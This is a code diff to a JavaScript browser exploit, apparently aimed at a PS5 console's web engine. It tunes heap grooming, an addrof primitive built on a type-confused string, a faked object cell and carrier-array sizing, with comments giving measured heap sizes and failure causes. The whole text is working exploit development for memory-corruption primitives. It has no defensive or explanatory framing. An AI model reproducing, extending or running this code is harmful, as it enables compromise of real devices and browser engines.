@@ -16,26 +16,18 @@ const HOLDER_BYTES = 0x40;
 const HX1400_LIGHT_CORE =
   new URLSearchParams(location.search).get("hx1400") === "1";
 
+// Heap profile, chosen with ?mem. Without one the groom uses drain 512 and
+// a carrier that starts small and grows only as far as coverage demands --
+// see CARRIER_CAP below. A fixed profile caps the carrier harder and drains
+// less, which is worth trying when a console keeps missing.
 const HX_MEM_LEVEL = (function () {
-  if (!HX1400_LIGHT_CORE) return 0;
-
   try {
-    const q =
-      new URLSearchParams(location.search).get("mem");
-
-    const n =
-      parseInt(q || "2", 10);
-
-    if (
-      Number.isFinite(n) &&
-      n >= 1 &&
-      n <= 5
-    ) {
-      return n;
-    }
+    const q = new URLSearchParams(location.search).get("mem");
+    const n = parseInt(q || (HX1400_LIGHT_CORE ? "2" : "0"), 10);
+    if (Number.isFinite(n) && n >= 1 && n <= 5) return n;
   } catch (e) {}
 
-  return 2;
+  return HX1400_LIGHT_CORE ? 2 : 0;
 })();
 
 const HX_MEM_PROFILES = [
@@ -116,17 +108,44 @@ const HX_MEM =
   HX_MEM_PROFILES[HX_MEM_LEVEL] || null;
 
 
-const CARRIER_SLOTS = (function () {
-  try {
-    const q = new URLSearchParams(location.search).get("slots");
-    const n = q ? parseInt(q, 10) : 0;
-    if (n >= 100000 && n <= 40000000) return n;
-  } catch (e) {}
-  return HX_MEM ? HX_MEM.slots : 12000000;
-})();
-const CARRIER_BYTES = CARRIER_SLOTS * 8;
-const CAPTURE_DELAY_MS = 50;
-const COMPOSE_DELAY_MS = 100;
+// How large the carrier may grow at most. `chars` comes out of the confused
+// string, so it is a heap lottery -- measured between 924,176 and 34,478,608,
+// a factor of 37. Only the large regime needs the 96 MB; in the small one
+// 1.85 MB is enough. So the carrier starts small and grows only when
+// `sourceCovered` rejects an attempt, which keeps the largest piece of work
+// out of the window in which fakeHost's layout has to hold still.
+const CARRIER_CAP = HX_MEM ? HX_MEM.slots : 12000000;
+
+let CARRIER_SLOTS = Math.min(CARRIER_CAP, 400000);
+let CARRIER_BYTES = CARRIER_SLOTS * 8;
+
+// A rejection does not draw a new lottery ticket: within one page load
+// `chars` is stable, so a run that is refused once will be refused again with
+// exactly the same minSlots. Too low a ceiling therefore fails the whole page
+// rather than a single attempt, and the ceiling has to carry the largest
+// regime (measured 8,619,650). Starting small and growing exactly keeps the
+// ordinary case light all the same.
+const CARRIER_MAX = 9000000; // 72 MB
+
+function growCarrier(minSlots) {
+  const cap = Math.min(CARRIER_CAP, CARRIER_MAX);
+  if (CARRIER_SLOTS >= cap) return false;
+  // Grow EXACTLY, with no margin: `minSlots` is the measured need
+  // (ceil(need/8)), and every byte beyond it is heap pressure for nothing.
+  if (minSlots > cap) return false;
+  CARRIER_SLOTS = Math.min(cap, Math.max(minSlots, CARRIER_SLOTS * 4));
+  CARRIER_BYTES = CARRIER_SLOTS * 8;
+  return true;
+}
+
+// fakeHost becomes a dictionary (three `delete`s), and a dictionary lets the
+// GC rearrange things. Between building it and the critical load sit 65,532
+// objects, a serialization of this graph, the carrier butterfly with its
+// write loop and two timer steps. If q2/q3 get pushed out of the inline
+// slots along the way, the faked cell's vector and length are 0, every index
+// lies out of bounds, `candidate[i]` is `undefined` -- and that reads back as
+// 0x30 zero bytes: `zero-header-miss`. So fakeHost is built late, right
+// before it is needed, and the carrier is allocated ahead of it.
 
 const symbolToString = Symbol.prototype.toString;
 
@@ -159,8 +178,12 @@ const GUARD_SIZE = _g("guard", HX_MEM ? HX_MEM.guard : 0x90000);
 const PREDECESSOR_SIZE = _g("pred", HX_MEM ? HX_MEM.pred : 0x80000);
 const FINAL_HOLE_SIZE = _g("final", HX_MEM ? HX_MEM.final : 0x80000);
 
-const __CORE_MEM_ESTIMATED_BYTES =
-  CARRIER_BYTES +
+// 150 ms of idling before the critical load is an invitation to the GC.
+const CAPTURE_DELAY_MS = _g("cap", 50);
+const COMPOSE_DELAY_MS = _g("comp", 100);
+
+// Without the carrier -- that one grows, and is added in the getter below.
+const CORE_MEM_WITHOUT_CARRIER =
   DRAIN_COUNT * DRAIN_SIZE +
   SLAB_SIZE +
   BUTTERFLY_HOLE_SIZE * 2 +
@@ -174,18 +197,26 @@ globalThis.__CORE_MEM_INFO =
   Object.freeze({
     hx1400: HX1400_LIGHT_CORE,
     memLevel: HX_MEM_LEVEL,
-    profile:
-      HX_MEM ? HX_MEM.name : null,
+    profile: HX_MEM ? HX_MEM.name : null,
 
-    slots: CARRIER_SLOTS,
-    carrierBytes: CARRIER_BYTES,
+    // A getter, because the carrier grows: a plain field would keep showing
+    // the starting value after the first growth and the readout would lie.
+    get slots() {
+      return CARRIER_SLOTS;
+    },
+    get carrierBytes() {
+      return CARRIER_BYTES;
+    },
+    slotsStart: CARRIER_SLOTS,
+    slotsCap: CARRIER_CAP,
 
     drainCount: DRAIN_COUNT,
     drainSize: DRAIN_SIZE,
 
     slabSize: SLAB_SIZE,
-    estimatedBytes:
-      __CORE_MEM_ESTIMATED_BYTES,
+    get estimatedBytes() {
+      return CORE_MEM_WITHOUT_CARRIER + CARRIER_BYTES;
+    },
   });
 
 
@@ -692,8 +723,6 @@ function startAttempt() {
   );
   try {
     buildAndStoreGraph();
-
-    for (let i = 0; i < 8; ++i) rwView[IDENT_OFFSET + i] = identityMagic[i];
     prepareAddrof();
   } catch (error) {
     finishEarlySafeAttempt(
@@ -801,7 +830,6 @@ function buildFakeHost() {
 
 function buildAndStoreGraph() {
   referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
-  buildFakeHost();
 
   emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
   fillerGraph = new Array(0xfffd);
@@ -830,12 +858,15 @@ function prepareAddrof() {
   };
 
   emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
+  // Allocate the bulk first, then build fakeHost: that puts the carrier
+  // butterfly ahead of the delicate object rather than behind it.
+  for (let i = 0; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
+  buildFakeHost();
+  for (let i = 0; i < 8; ++i) rwView[IDENT_OFFSET + i] = identityMagic[i];
   getterCarrier[0] = fakeHost;
-  for (let i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
   getterCarrier[1] = targetHolder;
   getterCarrier[2] = fakeHost;
   getterCarrier[3] = targetHolder;
-  emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");
 
   preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
   emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
@@ -851,7 +882,6 @@ function runAddrofCapture() {
     for (let i = 0; i < 16; i++)
       capturedWords[i] = capturedString.charCodeAt(7 + i);
 
-    /* RELEASE_CAPTURED_STRING_EARLY */
     capturedString = null;
 
     captureState = 1;
@@ -1121,9 +1151,6 @@ function loadHistoryCritical() {
     profile.nativeExecType = targetHeader[5];
     profile.nativeExecFlags = targetHeader[6];
 
-    try {
-      globalThis.__ps5NativeCtor = nativeConstructorAddress;
-    } catch (e) {}
     const nativeExecType1 = targetHeader[5];
 
     nativeExecutableHeaderOK =
@@ -1250,7 +1277,6 @@ function runGroomAndLoad() {
     ]);
     loadHistoryCritical();
 
-    /* RELEASE_HISTORY_GRAPH_EARLY */
     outerGraph = null;
     fillerGraph = null;
 
@@ -1328,7 +1354,6 @@ function beginComposition() {
   const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
   const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
 
-  /* ADDROF_COVERAGE_PATCH */
   const requiredSourceBytes = fakeChars * 2;
   const minimumSlots =
     Math.ceil(requiredSourceBytes / 8);
@@ -1350,6 +1375,8 @@ function beginComposition() {
   );
 
   if (!(repeated && distinct && plausible && sourceCovered)) {
+    if (!sourceCovered && growCarrier(minimumSlots))
+      emit("CARRIER-GROWN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
     finishEarlySafeAttempt(
       "ADDROF-FAIL",
       `repeat=${repeated}-distinct=${distinct}` +
@@ -1359,7 +1386,6 @@ function beginComposition() {
     return;
   }
 
-  /* RELEASE_ADDROF_OBJECTS_EARLY */
   capturedString = null;
   capturedWords = null;
   preparedSymbolObject = null;
@@ -1634,10 +1660,6 @@ export function establishPrimitive(options) {
   });
 }
 
-export function currentCarrier() {
-  return liveCandidate === null ? null : buildCarrier();
-}
-
 const RELEASED_BINDINGS = [
   "liveCandidate",
   "fakeHost",
@@ -1706,4 +1728,3 @@ export function carrierHomeVector() {
   return rwOriginalVector;
 }
 
-export { profile, aimCarrier, restoreCarrier, plausibleAddress, plausibleCell };
